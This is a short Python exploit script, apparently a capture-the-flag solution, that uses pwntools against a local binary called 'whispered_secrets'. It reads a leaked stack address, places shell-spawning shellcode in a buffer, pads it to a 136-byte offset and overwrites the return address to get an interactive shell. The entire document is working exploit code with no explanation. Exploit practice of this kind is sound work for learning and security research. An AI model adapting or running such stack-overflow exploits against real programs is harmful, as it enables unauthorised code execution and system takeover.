#!/usr/bin/env python3 

from pwn import * 
context.binary = elf=ELF("./whispered_secrets",checksec=False)
#libc = ELF('libc.so.6',checksec=False)

p=process(elf.path)

offset = 136 
ret = 0x000000000040101a

p.recvuntil(b"secret: ")
leak= int(p.recvline().strip(),16)
log.info(f"leak = {leak:#x}")

shell = asm(shellcraft.sh())

payload = flat(
    shell,
    b"A" * (offset - len(shell)),
    p64(leak)
)
p.send(payload)
p.interactive()